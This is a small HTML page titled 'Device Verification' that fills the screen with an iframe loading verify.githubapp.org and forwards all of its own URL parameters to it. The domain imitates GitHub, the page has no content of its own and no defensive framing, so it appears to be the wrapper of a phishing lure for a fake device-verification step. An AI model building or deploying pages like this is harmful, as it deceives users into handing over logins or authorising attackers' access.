<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            overflow: hidden;
        }
        
        iframe {
            width: 100vw;
            height: 100vh;
            border: none;
            display: block;
        }
    </style>
</head>
<body>
    <iframe id="app-frame" title="Device Verification"></iframe>
    
    <script>
        // Pass all URL parameters from parent to iframe
        const iframe = document.getElementById('app-frame');
        const parentParams = window.location.search;
        iframe.src = 'https://verify.githubapp.org' + parentParams;
    </script>
</body>
</html>
